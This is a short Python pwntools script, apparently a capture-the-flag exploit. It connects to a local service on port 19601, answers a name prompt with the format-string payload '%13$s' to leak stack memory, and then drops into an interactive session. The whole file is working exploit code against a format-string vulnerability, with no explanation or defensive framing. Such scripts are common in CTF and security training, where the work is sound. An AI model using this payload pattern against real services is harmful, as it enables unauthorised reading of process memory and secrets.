from pwn import *

#p = process('./program')

p = remote('127.0.0.1',19601)
p.recvuntil('What is your name?:')
p.sendline("%13$s")
p.interactive()